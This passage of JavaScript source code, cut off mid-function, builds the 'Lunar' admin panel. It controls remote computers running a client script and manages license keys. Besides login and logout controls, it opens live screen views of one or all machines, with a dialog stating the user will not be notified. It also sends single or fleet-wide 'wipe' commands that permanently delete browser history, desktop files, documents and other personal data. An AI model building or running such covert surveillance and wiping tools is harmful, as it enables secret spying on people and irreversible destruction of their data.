/* ============================================================
   LUNAR ADMIN PANEL
   ============================================================ */
class LunarAdminPanel {
  constructor(container) {
    this.container = container;
    this.devices = {};
    this.licenses = {};
    this.deviceWidgets = {};
    this.licenseWidgets = {};
    this.expandedDevices = new Set();
    this.expandedLicenses = new Set();
    this.refreshTimer = null;
    this.destroyed = false;
    this.screenWindows = {};
    this.autoDeletedLicenses = new Set();
    this.lunarReady = true;
    this.lunarInitError = '';
    this.supabase = null;
    this.refreshLock = false;
    this.currentTab = 'computers';

    this._init();
  }

  _init() {
    try {
      if (typeof supabase === 'undefined' || !supabase.createClient) {
        throw new Error('Supabase JS library not loaded');
      }
      this.supabase = supabase.createClient(
        CONFIG.LUNAR_SUPABASE_URL,
        CONFIG.LUNAR_SUPABASE_ADMIN_KEY
      );
    } catch (e) {
      this.lunarReady = false;
      this.lunarInitError = e.message || String(e);
    }

    this._build();

    if (this.lunarReady) {
      this._startRefresh();
      this.log('Lunar Admin started');
    } else {
      this.log('⚠ Lunar panel not available');
      this.log('   Reason: ' + this.lunarInitError);
    }
  }

  _build() {
    clear(this.container);
    const self = this;

    const wrapper = el('div', {
      style: {
        display: 'flex', flexDirection: 'column', height: '100%',
        background: 'var(--l-bg-dark)', color: 'var(--l-text-primary)',
        overflow: 'hidden',
      }
    });

    // Header
    const header = el('div', {
      style: {
        background: 'var(--l-bg-header)', padding: '10px 14px',
        display: 'flex', alignItems: 'center', gap: '10px',
        flexWrap: 'wrap', flexShrink: '0',
        borderBottom: '1px solid var(--l-border)',
      }
    });
    header.appendChild(el('div', {},
      el('div', { style: { fontSize: '18px', fontWeight: '800', letterSpacing: '2px' } }, 'LUNAR'),
      el('div', { class: 'text-xs', style: { color: 'var(--l-text-muted)' } }, 'Administrator Control Panel')
    ));

    const headerBtns = el('div', { class: 'flex gap-1 flex-wrap', style: { marginLeft: 'auto' } });
    this.computerCountLabel = el('span', { class: 'badge badge-online' }, 'Online: 0');
    headerBtns.appendChild(this.computerCountLabel);
    headerBtns.appendChild(this._lBtn('🖥 ALL SCREENS', () => self.showAllScreens(), 'var(--l-accent-purple)'));
    headerBtns.appendChild(this._lBtn('🛑 CLOSE ALL', () => self.closeAllScreens(), 'var(--l-accent-orange)'));
    headerBtns.appendChild(this._lBtn('LOGIN ALL', () => self.loginAll(), 'var(--l-accent-green)'));
    headerBtns.appendChild(this._lBtn('LOGOUT ALL', () => self.logoutAll(), 'var(--l-accent-red)'));
    headerBtns.appendChild(this._lBtn('☠ WIPE ALL', () => self.wipeAllComputers(), 'var(--l-wipe-red)'));
    headerBtns.appendChild(this._lBtn('REFRESH', () => self.manualRefresh(), '#334155'));
    header.appendChild(headerBtns);
    wrapper.appendChild(header);

    // Tab bar
    const tabBar = el('div', { class: 'l-tab-bar' });
    const tabs = [
      ['computers', '  LIVE COMPUTERS  '],
      ['licenses', '  LICENSES  '],
      ['log', '  LOG  '],
    ];
    this.tabButtons = {};
    for (const [key, label] of tabs) {
      const btn = el('button', {
        class: 'l-tab-btn' + (key === 'computers' ? ' active' : ''),
        onclick: () => self.switchTab(key),
      }, label);
      tabBar.appendChild(btn);
      this.tabButtons[key] = btn;
    }
    wrapper.appendChild(tabBar);

    // Tab contents
    this.tabContents = {};
    for (const [key] of tabs) {
      const content = el('div', {
        class: 'tab-content' + (key === 'computers' ? ' active' : ''),
        style: { flex: '1', overflow: 'hidden', display: key === 'computers' ? 'flex' : 'none', flexDirection: 'column' },
      });
      this.tabContents[key] = content;
      wrapper.appendChild(content);
    }

    this._buildComputersTab();
    this._buildLicensesTab();
    this._buildLogTab();

    this.container.appendChild(wrapper);

    if (!this.lunarReady) {
      const banner = el('div', {
        style: {
          position: 'absolute', top: '50%', left: '50%',
          transform: 'translate(-50%, -50%)', background: '#7f1d1d',
          color: '#fff', padding: '24px', borderRadius: '12px',
          textAlign: 'center', maxWidth: '90%', zIndex: '10',
        }
      },
        el('div', { style: { fontSize: '16px', fontWeight: '700', marginBottom: '8px' } }, '⚠ Lunar Panel unavailable'),
        el('div', { class: 'text-sm', style: { marginBottom: '8px' } }, 'Missing Supabase JS library or configuration.'),
        el('div', { class: 'text-xs', style: { opacity: 0.8 } }, this.lunarInitError)
      );
      wrapper.appendChild(banner);
    }
  }

  _lBtn(text, onclick, bg) {
    const btn = el('button', {
      class: 'l-btn l-btn-sm',
      style: { background: bg },
      onclick,
    }, text);
    btn.addEventListener('mouseenter', () => { btn.style.filter = 'brightness(1.15)'; });
    btn.addEventListener('mouseleave', () => { btn.style.filter = ''; });
    return btn;
  }

  _buildComputersTab() {
    const self = this;
    const content = this.tabContents.computers;
    const scroll = el('div', {
      class: 'scroll-area',
      style: { flex: '1', overflowY: 'auto', padding: '10px' },
    });
    this.computerContainer = el('div', {});
    scroll.appendChild(this.computerContainer);
    content.appendChild(scroll);
  }

  _buildLicensesTab() {
    const self = this;
    const content = this.tabContents.licenses;
    const wrapper = el('div', { style: { display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' } });

    const topBar = el('div', { class: 'flex gap-2 flex-wrap p-2' },
      el('button', { class: 'l-btn l-btn-sm', style: { background: 'var(--l-accent-green)' }, onclick: () => self.openCreateLicenseDialog() }, '➕ CREATE NEW LICENSE'),
      el('button', { class: 'l-btn l-btn-sm', style: { background: 'var(--l-accent-orange)' }, onclick: () => self.removeExpiredLicenses() }, '🧹 REMOVE EXPIRED')
    );
    this.licenseStatsLabel = el('span', { class: 'text-xs', style: { color: 'var(--l-text-secondary)', marginLeft: 'auto', alignSelf: 'center' } }, '');
    topBar.appendChild(this.licenseStatsLabel);
    wrapper.appendChild(topBar);

    const scroll = el('div', {
      class: 'scroll-area',
      style: { flex: '1', overflowY: 'auto', padding: '0 10px 10px' },
    });
    this.licenseContainer = el('div', {});
    scroll.appendChild(this.licenseContainer);
    wrapper.appendChild(scroll);

    content.appendChild(wrapper);
  }

  _buildLogTab() {
    const content = this.tabContents.log;
    const scroll = el('div', { class: 'scroll-area', style: { flex: '1', overflowY: 'auto', padding: '10px' } });
    this.logBox = el('div', { class: 'l-log-box', style: { maxHeight: 'none', minHeight: '300px' } });
    scroll.appendChild(this.logBox);
    content.appendChild(scroll);
  }

  switchTab(key) {
    this.currentTab = key;
    for (const [k, btn] of Object.entries(this.tabButtons)) {
      btn.classList.toggle('active', k === key);
    }
    for (const [k, content] of Object.entries(this.tabContents)) {
      content.style.display = k === key ? 'flex' : 'none';
    }
  }

  log(message) {
    const timestamp = new Date().toTimeString().slice(0, 8);
    const line = el('div', { style: { padding: '2px 0' } }, `[${timestamp}] ${message}`);
    if (this.logBox) {
      this.logBox.appendChild(line);
      this.logBox.scrollTop = this.logBox.scrollHeight;
      while (this.logBox.children.length > 1000) this.logBox.removeChild(this.logBox.firstChild);
    }
    console.log('[LUNAR]', `[${timestamp}]`, message);
  }

  _startRefresh() {
    const loop = async () => {
      if (this.destroyed) return;
      await this.refreshData();
      this.refreshTimer = setTimeout(loop, CONFIG.LUNAR_REFRESH_SECONDS * 1000);
    };
    this.refreshTimer = setTimeout(loop, 500);
  }

  manualRefresh() {
    if (this.destroyed) return;
    this.log('Manual refresh requested');
    this.refreshData();
  }

  async refreshData() {
    if (this.destroyed || !this.lunarReady || this.refreshLock) return;
    this.refreshLock = true;
    try {
      let devices = [];
      let licenses = [];
      try {
        const { data } = await this.supabase.from('lunar_devices').select('*').order('last_seen_at', { ascending: false });
        devices = data || [];
      } catch (e) { this.log('Device refresh error: ' + (e.message || e)); }
      try {
        const { data } = await this.supabase.from('lunar_licenses').select('*').order('created_at', { ascending: false });
        licenses = data || [];
      } catch (e) { this.log('License refresh error: ' + (e.message || e)); }

      const newDevices = {};
      for (const d of devices) {
        if (!d || !isLunarDeviceOnline(d)) continue;
        const id = String(d.device_id || '').trim();
        if (!id) continue;
        newDevices[id] = d;
      }
      const newLicenses = {};
      for (const l of licenses) {
        const key = String(l.license_key || '').trim();
        if (!key) continue;
        newLicenses[key] = l;
      }

      this.devices = newDevices;
      this.licenses = newLicenses;

      this.updateDeviceCards();
      this.updateLicenseCards();
      this._checkExpiredLicenses();
    } finally {
      this.refreshLock = false;
    }
  }

  /* ---------- Expired license handling ---------- */
  _checkExpiredLicenses() {
    const expired = [];
    for (const [key, item] of Object.entries(this.licenses)) {
      const info = licenseTimeLeft(item);
      if (info.status === 'expired' && !this.autoDeletedLicenses.has(key)) {
        expired.push([key, item]);
      }
    }
    for (const [key, item] of expired) {
      this.autoDeletedLicenses.add(key);
      this._handleExpiredLicense(key, item);
    }
  }

  _handleExpiredLicense(licenseKey, licenseItem) {
    if (!licenseItem.is_active) {
      this.log(`License expired (was inactive): ${licenseKey}`);
      return;
    }
    const notes = licenseItem.notes || '(no notes)';
    const expires = formatTime(licenseItem.expires_at);
    confirmDialog(
      'License Expired',
      `License has EXPIRED:\n\n${licenseKey}\n\nExpired at: ${expires}\nNotes: ${notes}\n\n` +
      `Yes → Renew (set new expiry)\nNo → Delete license now\nCancel → Keep it (inactive)`,
      () => {
        this._autoDisableLicense(licenseKey, 'Expired - awaiting renewal');
        this.openEditLicenseDialog(licenseItem);
      },
      { dark: true, confirmText: 'Renew', onCancel: () => {
        // Treat cancel as "keep inactive"
        this._autoDisableLicense(licenseKey, 'Expired');
        this.log(`License expired but kept: ${licenseKey}`);
      }}
    );
  }

  async _autoDisableLicense(licenseKey, reason) {
    try {
      await this.supabase.from('lunar_licenses').update({
        is_active: false,
        updated_at: utcNowISO(),
        notes: reason,
      }).eq('license_key', licenseKey);
      this.log(`License auto-disabled: ${licenseKey} (${reason})`);
      const matching = Object.values(this.devices).filter(d => d.license_key === licenseKey);
      for (const d of matching) {
        await this.sendDeviceCommand(d.device_id, 'logout', '');
      }
    } catch (e) { this.log('Auto-disable error: ' + (e.message || e)); }
  }

  async _deleteExpiredLicenseWorker(licenseKey) {
    try {
      const matching = Object.values(this.devices).filter(d => d.license_key === licenseKey);
      for (const d of matching) {
        await this.supabase.from('lunar_devices').update({
          license_key: null,
          admin_command: 'logout',
          admin_license_key: '',
          command_id: makeCommandId(),
          command_created_at: utcNowISO(),
          command_status: 'pending',
          command_message: 'License expired and removed',
          updated_at: utcNowISO(),
        }).eq('device_id', d.device_id);
      }
      await this.supabase.from('lunar_licenses').delete().eq('license_key', licenseKey);
      this.log(`Expired license deleted: ${licenseKey}`);
      this.refreshData();
    } catch (e) { this.log('Delete expired license error: ' + (e.message || e)); }
  }

  removeExpiredLicenses() {
    const expiredKeys = [];
    for (const [key, item] of Object.entries(this.licenses)) {
      if (licenseTimeLeft(item).status === 'expired') expiredKeys.push(key);
    }
    if (!expiredKeys.length) { toast('No expired licenses found', 'warning'); return; }
    confirmDialog('Remove Expired',
      `Delete ${expiredKeys.length} expired license(s)? This cannot be undone.`,
      () => { for (const key of expiredKeys) this._deleteExpiredLicenseWorker(key); },
      { danger: true, dark: true, confirmText: 'Delete' });
  }

  /* ---------- Device cards ---------- */
  updateDeviceCards() {
    const currentIds = new Set(Object.keys(this.devices));
    const existingIds = new Set(Object.keys(this.deviceWidgets));
    for (const id of existingIds) {
      if (!currentIds.has(id)) {
        const w = this.deviceWidgets[id];
        if (w && w.card) w.card.remove();
        delete this.deviceWidgets[id];
        this.expandedDevices.delete(id);
        const viewer = this.screenWindows[id];
        if (viewer && viewer.close) viewer.close();
        delete this.screenWindows[id];
      }
    }

    clear(this.computerContainer);
    const sorted = Object.values(this.devices).sort((a, b) =>
      String(a.computer_name || '').toLowerCase().localeCompare(String(b.computer_name || '').toLowerCase()));

    if (!sorted.length) {
      this.computerContainer.appendChild(el('div', { class: 'empty-state' },
        el('span', { class: 'icon' }, '🖥'),
        'No online computers right now.\n\nStart user.py on a computer and it will appear here.'
      ));
    } else {
      for (const device of sorted) {
        this.computerContainer.appendChild(this._createDeviceCard(device));
      }
    }

    this.computerCountLabel.textContent = `Online: ${Object.keys(this.devices).length}`;
  }

  _createDeviceCard(device) {
    const self = this;
    const deviceId = String(device.device_id || '');
    const computerName = String(device.computer_name || 'Unknown Computer');
    const isExpanded = this.expandedDevices.has(deviceId);

    const card = el('div', { class: 'l-card' });

    // Header
    const header = el('div', { class: 'l-card-header' });
    const expandBtn = el('button', {
      class: 'l-btn l-btn-xs',
      style: { background: 'transparent', color: 'var(--l-text-secondary)', minWidth: '28px' },
      onclick: () => self.toggleDevice(deviceId),
    }, isExpanded ? '▲' : '▼');
    header.appendChild(expandBtn);
    header.appendChild(el('span', { style: { fontWeight: '700', fontSize: '13px' } }, computerName));
    header.appendChild(el('span', { class: 'badge badge-online' }, '● ONLINE'));
    header.appendChild(el('span', { class: 'text-xs', style: { color: 'var(--l-text-muted)' } }, 'IP: ' + (device.public_ip || '—')));

    const actions = el('div', { class: 'flex gap-1 flex-wrap', style: { marginLeft: 'auto' } });
    actions.appendChild(this._lBtn('🖥 VIEW', () => self.openScreenViewer(deviceId), 'var(--l-accent-purple)'));
    actions.appendChild(this._lBtn('☠ WIPE', () => self.wipeComputer(deviceId), 'var(--l-wipe-red)'));
    actions.appendChild(this._lBtn('LOGIN AUTO', () => self.loginDevice(deviceId), 'var(--l-accent-green)'));
    actions.appendChild(this._lBtn('LOGOUT', () => self.logoutDevice(deviceId), 'var(--l-accent-red)'));
    header.appendChild(actions);

    card.appendChild(header);

    // Body
    const body = el('div', { class: 'l-card-body' + (isExpanded ? ' open' : '') });

    const infoGrid = el('div', { class: 'grid grid-2', style: { gap: '8px', marginBottom: '10px' } });

    const fields = [
      ['License', device.license_key || 'Not logged in'],
      ['Device ID', deviceId],
      ['Last Seen', formatTime(device.last_seen_at)],
      ['Command Status', (device.command_status || '—') + (device.command_message ? ' • ' + device.command_message : '')],
    ];
    for (const [label, value] of fields) {
      infoGrid.appendChild(el('div', {},
        el('div', { class: 'text-xs', style: { color: 'var(--l-text-muted)', marginBottom: '2px' } }, label),
        el('div', { class: 'text-sm font-mono', style: { wordBreak: 'break-all' } }, value)
      ));
    }
    body.appendChild(infoGrid);

    // License selector
    const licenseRow = el('div', { class: 'flex gap-2 flex-wrap items-center' });
    licenseRow.appendChild(el('span', { class: 'text-xs', style: { color: 'var(--l-text-muted)' } }, 'Login License:'));
    const select = el('select', { class: 'l-select', style: { flex: '1', minWidth: '150px' } });
    const activeLicenses = Object.entries(this.licenses)
      .filter(([k, v]) => v.is_active && licenseTimeLeft(v).status !== 'expired')
      .map(([k]) => k);
    select.appendChild(el('option', { value: '' }, '-- select --'));
    for (const k of activeLicenses) select.appendChild(el('option', { value: k }, k));
    if (device.license_key) select.value = device.license_key;
    licenseRow.appendChild(select);
    licenseRow.appendChild(this._lBtn('LOGIN', () => self.loginDevice(deviceId, select.value), 'var(--l-accent-blue)'));
    body.appendChild(licenseRow);

    card.appendChild(body);
    this.deviceWidgets[deviceId] = { card, body, expandBtn };
    return card;
  }

  toggleDevice(deviceId) {
    if (this.expandedDevices.has(deviceId)) this.expandedDevices.delete(deviceId);
    else this.expandedDevices.add(deviceId);
    this.updateDeviceCards();
  }

  /* ---------- Screen viewer ---------- */
  openScreenViewer(deviceId) {
    const device = this.devices[deviceId];
    if (!device) { toast('Device not found', 'error'); return; }
    const computerName = String(device.computer_name || '');

    if (this.screenWindows[deviceId] && !this.screenWindows[deviceId].closing) {
      this.screenWindows[deviceId].show();
      return;
    }

    confirmDialog('Start Screen View',
      `Open live screen view for:\n\n${computerName || 'Unknown Computer'}\n\nUser will NOT be notified.`,
      () => {
        this._enableScreenView(deviceId);
        const viewer = new ScreenViewer(deviceId, computerName, this);
        this.screenWindows[deviceId] = viewer;
      },
      { dark: true, confirmText: 'Open' });
  }

  async _enableScreenView(deviceId) {
    try {
      await this.supabase.rpc('lunar_set_screen_view', { p_device_id: deviceId, p_active: true });
      this.log(`Screen view ENABLED → ${deviceId}`);
    } catch (e) { this.log('Screen enable error: ' + (e.message || e)); }
  }

  showAllScreens() {
    const self = this;
    const deviceIds = Object.keys(this.devices);
    if (!deviceIds.length) { toast('No online computers', 'warning'); return; }
    confirmDialog('SHOW ALL SCREENS',
      `Open live screen viewers for ${deviceIds.length} online computer(s)?\n\nUser will NOT be notified.`,
      () => {
        for (const id of deviceIds) {
          if (self.screenWindows[id] && !self.screenWindows[id].closing) continue;
          self._enableScreenView(id);
          const device = self.devices[id];
          const viewer = new ScreenViewer(id, device.computer_name || '', self);
          self.screenWindows[id] = viewer;
        }
        self.log(`SHOW ALL SCREENS → opened ${deviceIds.length} viewers`);
      },
      { dark: true, confirmText: 'Open All' });
  }

  closeAllScreens() {
    const open = Object.values(this.screenWindows).filter(v => !v.closing);
    if (!open.length) { toast('No screen viewers open', 'warning'); return; }
    confirmDialog('CLOSE ALL SCREENS',
      `Close all ${open.length} open screen viewer(s)?`,
      () => {
        for (const v of Object.values(this.screenWindows)) {
          if (!v.closing) v.close();
        }
        this.screenWindows = {};
        this.log(`CLOSE ALL SCREENS → closed ${open.length} viewer(s)`);
      },
      { dark: true, confirmText: 'Close All' });
  }

  /* ---------- Wipe ---------- */
  wipeComputer(deviceId) {
    const device = this.devices[deviceId];
    if (!device) { toast('Device not found', 'error'); return; }
    const name = device.computer_name || 'Unknown';
    confirmDialog('☠ WIPE COMPUTER — IRREVERSIBLE',
      `You are about to PERMANENTLY DELETE everything on:\n\n  ${name}\n\n` +
      `This will remove:\n• Edge browser history\n• Chrome history + cache\n• Desktop files & folders\n• Downloads\n• Documents, Pictures, Videos, Music\n• Temp files\n\n` +
      `Files are NOT sent to Recycle Bin.\nThis CANNOT be undone.\n\nContinue?`,
      () => {
        confirmDialog('Final Confirmation',
          `Really wipe ${name}?\n\nThere is NO undo.`,
          () => {
            this.sendDeviceCommand(deviceId, 'wipe', '');
            this.log(`☠ WIPE command sent → ${name}`);
          },
          { danger: true, dark: true, confirmText: 'WIPE' });
      },
      { danger: true, dark: true, confirmText: 'Continue' });
  }

  wipeAllComputers() {
    const ids = Object.keys(this.devices);
    if (!ids.length) { toast('No online computers', 'warning'); return; }
    confirmDialog('☠ WIPE ALL COMPUTERS — IRREVERSIBLE',
      `You are about to PERMANENTLY DELETE everything on ${ids.length} online computer(s).\n\n` +
      `Files are NOT sent to Recycle Bin.\nThis CANNOT be undone.\n\nContinue?`,
      () => {
        confirmDialog('Final Confirmation',
          `Really wipe ALL ${ids.length} computer(s)?\n\nThere is NO undo.`,
          () => {
            for (const id of ids) this.sendDeviceCommand(id, 'wipe', '');
            this.log(`☠ WIPE ALL queued for ${ids.length} devices`);
          },
          { danger: true, dark: true, confirmText: 'WIPE ALL' });
      },
      { danger: true, dark: true, confirmText: 'Continue' });
  }

  /* ---------- Login / Logout ---------- */
  loginDevice(deviceId, licenseKey) {
    const device = this.devices[deviceId];
    if (!device) { toast('Device not found', 'error'); return; }
    if (!licenseKey) licenseKey = device.license_key || '';
    if (!licenseKey) {
      const active = Object.entries(this.licenses)
        .filter(([k, v]) => v.is_active && licenseTimeLeft(v).status !== 'expired')
        .map(([k]) => k);
      if (active.length) licenseKey = active[0];
    }
    if (!licenseKey) { toast('No active license available', 'warning'); return; }
    const lic = this.licenses[licenseKey];
    if (lic) {
      if (!lic.is_active) { toast('Selected license is inactive', 'error'); return; }
      if (licenseTimeLeft(lic).status === 'expired') { toast('Selected license is expired', 'error'); return; }
    }
    this.sendDeviceCommand(deviceId, 'login', licenseKey);
  }

  logoutDevice(deviceId) {
    if (!this.devices[deviceId]) return;
    this.sendDeviceCommand(deviceId, 'logout', '');
  }

  async sendDeviceCommand(deviceId, command, licenseKey) {
    const device = this.devices[deviceId];
    if (!device) { this.log('Device not found: ' + deviceId); return; }
    const computerName = device.computer_name || '';
    const commandId = makeCommandId();
    const message = command === 'login' ? 'Login command sent'
      : command === 'logout' ? 'Logout command sent'
      : command === 'wipe' ? 'Wipe command sent' : 'Unknown command';

    const payload = {
      admin_command: String(command),
      admin_license_key: command === 'login' ? String(licenseKey) : '',
      command_id: commandId,
      command_created_at: utcNowISO(),
      command_status: 'pending',
      command_message: message,
      updated_at: utcNowISO(),
    };

    this.log(`${command.toUpperCase()} → ${computerName} | cmd_id=${commandId}`);
    try {
      const { data } = await this.supabase.from('lunar_devices').update(payload).eq('device_id', deviceId).select();
      if (!data || !data.length) throw new Error('No device row was updated.');
      this.log(`Command sent: ${command.toUpperCase()} | ${computerName}`);
      this.refreshData();
    } catch (e) {
      this.log(`COMMAND ERROR | ${command.toUpperCase()} | ${computerName} | ${e.message || e}`);
      toast('Command error: ' + (e.message || e), 'error');
    }
  }

  loginAll() {
    const ids = Object.keys(this.devices);
    if (!ids.length) { toast('No online computers', 'warning'); return; }
    const active = Object.entries(this.licenses)
      .filter(([k, v]) => v.is_active && licenseTimeLeft(v).status !== 'expired')
      .map(([k]) => k);
    if (!active.length) { toast('No active license available', 'warning'); return; }
    const defaultLicense = active[0];
    confirmDialog('LOGIN ALL',
      `Send LOGIN AUTO to ${ids.length} online computer(s)?\n\nLicense:\n${defaultLicense}`,
      () => {
        for (const id of ids) this.sendDeviceCommand(id, 'login', defaultLicense);
        this.log(`LOGIN ALL queued for ${ids.length} devices`);
      },
      { dark: true, confirmText: 'Login All' });
  }

  logoutAll() {
    const ids = Object.keys(this.devices);
    if (!ids.length) { toast('No online computers', 'warning'); return; }
    confirmDialog('LOGOUT ALL',
      `Send LOGOUT to ${ids.length} online computer(s)?`,
      () => {
        for (const id of ids) this.sendDeviceCommand(id, 'logout', '');
        this.log(`LOGOUT ALL queued for ${ids.length} devices`);
      },
      { dark: true, confirmText: 'Logout All' });
  }

  /* ---------- License dialogs ---------- */
  openCreateLicenseDialog() {
    const self = this;
    const modal = new LicenseDialogModal(null, 'create', null, (result) => {
      if (result) self._createLicenseWorker(result);
    });
  }

  openEditLicenseDialog(licenseItem) {
    const self = this;
    const modal = new LicenseDialogModal(null, 'edit', licenseItem, (result) => {
      if (result) self._updateLicenseWorker(result);
    });
  }

  async _createLicenseWorker(payload) {
    const key = payload.license_key;
    if (this.licenses[key]) { toast('License already exists', 'warning'); return; }
    try {
      await this.supabase.from('lunar_licenses').insert({
        license_key: key,
        is_active: !!payload.is_active,
        notes: payload.notes || 'Created by Lunar Admin',
        expires_at: payload.expires_at,
        created_at: utcNowISO(),
        updated_at: utcNowISO(),
      });
      this.log(`License created: ${key} (expires ${formatTime(payload.expires_at)})`);
      this.autoDeletedLicenses.delete(key);
      this.refreshData();
      toast('License created', 'success');
    } catch (e) {
      this.log('License creation error: ' + (e.message || e));
      toast('Creation error: ' + (e.message || e), 'error');
    }
  }

  async _updateLicenseWorker(payload) {
    try {
      await this.supabase.from('lunar_licenses').update({
        is_active: !!payload.is_active,
        notes: payload.notes,
        expires_at: payload.expires_at,
        updated_at: utcNowISO(),
      }).eq('license_key', payload.license_key);
      this.log(`License updated: ${payload.license_key} (new expiry ${formatTime(payload.expires_at)})`);
      this.autoDeletedLicenses.delete(payload.license_key);
      this.refreshData();
      toast('License updated', 'success');
    } catch (e) {
      this.log('License update error: ' + (e.message || e));
      toast('Update error: ' + (e.message || e), 'error');
    }
  }

  /* ---------- License cards ---------- */
  updateLicenseCards() {
    clear(this.licenseContainer);
    const keys = Object.keys(this.licenses);
    if (!keys.length) {
      this.licenseContainer.appendChild(el('div', { class: 'empty-state' },
        el('span', { class: 'icon' }, '🔑'),
        'No licenses yet.\n\nClick "➕ CREATE NEW LICENSE" to add one.'
      ));
    } else {
      for (const key of keys) {
        this.licenseContainer.appendChild(this._createLicenseCard(this.licenses[key]));
      }
    }

    let total = keys.length, active = 0, expired = 0, expiring = 0;
    for (const item of Object.values(this.licenses)) {
      const s = licenseTimeLeft(item).status;
      if (s === 'active') active++;
      else if (s === 'expiring') expiring++;
      else if (s === 'expired') expired++;
    }
    this.licenseStatsLabel.textContent = `Total: ${total}  Active: ${active}  Expiring: ${expiring}  Expired: ${expired}`;
  }

  _createLicenseCard(item) {
    const self = this;
    const key = String(item.license_key || '');
    const isExpanded = this.expandedLicenses.has(key);
    const info = licenseTimeLeft(item);

    const card = el('div', { class: 'l-card' });
    const header = el('div', { class: 'l-card-header' });

    const expandBtn = el('button', {
      class: 'l-btn l-btn-xs',
      style: { background: 'transparent', color: 'var(--l-text-secondary)', minWidth: '28px' },
      onclick: () => self.toggleLicense(key),
    }, isExpanded ? '▲' : '▼');
    header.appendChild(expandBtn);
    header.appendChild(el('span', { class: 'font-mono text-sm font-bold' }, key));
    header.appendChild(el('span', { class: 'badge badge-' + (info.status === 'expired' ? 'expired' : item.is_active ? (info.status === 'expiring' ? 'expiring' : 'active') : 'restricted') },
      info.status === 'expired' ? 'EXPIRED' : !item.is_active ? 'RESTRICTED' : info.status === 'expiring' ? 'EXPIRING' : 'ACTIVE'));
    header.appendChild(el('span', { class: 'countdown text-xs', style: { color: info.status === 'expired' ? 'var(--l-expired)' : info.status === 'expiring' ? 'var(--l-expiring)' : 'var(--l-online)' } }, info.text));

    const actions = el('div', { class: 'flex gap-1 flex-wrap', style: { marginLeft: 'auto' } });
    actions.appendChild(this._lBtn('✏ EDIT', () => self.openEditLicenseDialog(item), 'var(--l-accent-blue)'));
    actions.appendChild(this._lBtn('🔄 RENEW', () => self.openEditLicenseDialog(item), 'var(--l-accent-cyan)'));
    actions.appendChild(this._lBtn('RESTRICT', () => self.setLicenseActive(key, false), 'var(--l-accent-orange)'));
    actions.appendChild(this._lBtn('ACTIVATE', () => self.setLicenseActive(key, true), 'var(--l-accent-green)'));
    actions.appendChild(this._lBtn('DELETE', () => self.deleteLicense(key), 'var(--l-wipe-red)'));
    header.appendChild(actions);
    card.appendChild(header);

    const body = el('div', { class: 'l-card-body' + (isExpanded ? ' open' : '') });
    const grid = el('div', { class: 'grid grid-2', style: { gap: '8px' } });
    for (const [label, value] of [
      ['Created', formatTime(item.created_at)],
      ['Updated', formatTime(item.updated_at)],
      ['Expires At', formatTime(item.expires_at)],
      ['Time Remaining', info.text],
      ['Notes', item.notes || '—'],
    ]) {
      grid.appendChild(el('div', {},
        el('div', { class: 'text-xs', style: { color: 'var(--l-text-muted)', marginBottom: '2px' } }, label),
        el('div', { class: 'text-sm', style: { wordBreak: 'break-word' } }, value)
      ));
    }
    body.appendChild(grid);
    card.appendChild(body);
    return card;
  }

  toggleLicense(key) {
    if (this.expandedLicenses.has(key)) this.expandedLicenses.delete(key);
    else this.expandedLicenses.add(key);
    this.updateLicenseCards();
  }

  async setLicenseActive(licenseKey, active) {
    try {
      await this.supabase.from('lunar_licenses').update({
        is_active: !!active,
        updated_at: utcNowISO(),
      }).eq('license_key', licenseKey);
      this.log(`License ${active ? 'activate' : 'restrict'}: ${licenseKey}`);
      if (active) this.autoDeletedLicenses.delete(licenseKey);
      else {
        const matching = Object.values(this.devices).filter(d => d.license_key === licenseKey);
        for (const d of matching) await this.sendDeviceCommand(d.device_id, 'logout', '');
      }
      this.refreshData();
    } catch (e) { this.log('License update error: ' + (e.message || e)); }
  }

  deleteLicense(licenseKey) {
    if (!this.licenses[licenseKey]) return;
    confirmDialog('Delete License',
      `Delete this license?\n\n${licenseKey}\n\nThis cannot be undone.`,
      () => this._deleteLicenseWorker(licenseKey),
      { danger: true, dark: true, confirmText: 'Delete' });
  }

  async _deleteLicenseWorker(licenseKey) {
    try {
      const matching = Object.values(this.devices).filter(d => d.license_key === licenseKey);
      for (const d of matching) {
        await this.supabase.from('lunar_devices').update({
          license_key: null,
          admin_command: 'logout',
          admin_license_key: '',
          command_id: makeCommandId(),
          command_created_at: utcNowISO(),
          command_status: 'pending',
          command_message: 'License deleted',
          updated_at: utcNowISO(),
        }).eq('device_id', d.device_id);
      }
      await this.supabase.from('lunar_licenses').delete().eq('license_key', licenseKey);
      this.log('License deleted: ' + licenseKey);
      this.autoDeletedLicenses.delete(licenseKey);
      this.refreshData();
    } catch (e) { this.log('License delete error: ' + (e.message || e)); }
  }

  destroy() {
    this.destroyed = true;
    if (this.refreshTimer) clearTimeout(this.refreshTimer);
    for (const v of Object.values(this.screenWindows)) {
      if (v && v.close) v.close();
    }
    this.screenWindows = {};
  }
}

/* ============================================================
   LICENSE DIALOG MODAL
   ============================================================ */
class LicenseDialogModal {
  constructor(parent, mode, licenseItem, onResult) {
    this.mode = mode;
    this.licenseItem = licenseItem || {};
    this.onResult = onResult;
    this._build();
  }

  _build() {
    const self = this;
    const isEdit = this.mode === 'edit';
    const item = this.licenseItem;

    const body = el('div', { class: 'flex flex-col gap-3' });

    // Key
    const keyInput = el('input', {
      type: 'text',
      class: 'l-input font-mono',
      placeholder: 'LICENSE-KEY',
    });
    keyInput.value = isEdit ? (item.license_key || '') : generateLicenseKey('LUNAR', 3, 6);
    if (isEdit) keyInput.disabled = true;

    body.appendChild(el('div', {},
      el('label', { class: 'text-xs font-bold mb-1', style: { display: 'block', color: 'var(--l-text-muted)' } }, 'LICENSE KEY'),
      keyInput
    ));

    // Generator (create only)
    if (!isEdit) {
      const prefix = el('input', { type: 'text', class: 'l-input', value: 'LUNAR', style: { width: '80px' } });
      const groups = el('input', { type: 'number', class: 'l-input', value: '3', style: { width: '60px' } });
      const length = el('input', { type: 'number', class: 'l-input', value: '6', style: { width: '60px' } });
      const genRow = el('div', { class: 'flex gap-2 flex-wrap items-center' },
        el('span', { class: 'text-xs', style: { color: 'var(--l-text-muted)' } }, 'Prefix:'), prefix,
        el('span', { class: 'text-xs', style: { color: 'var(--l-text-muted)' } }, 'Groups:'), groups,
        el('span', { class: 'text-xs', style: { color: 'var(--l-text-muted)' } }, 'Len:'), length,
        el('button', { class: 'l-btn l-btn-xs', style: { background: 'var(--l-accent-blue)' }, onclick: () => {
          keyInput.value = generateLicenseKey(prefix.value, groups.value, length.value);
        }}, 'AUTO-GENERATE'),
        el('button', { class: 'l-btn l-btn-xs', style: { background: '#334155' }, onclick: () => {
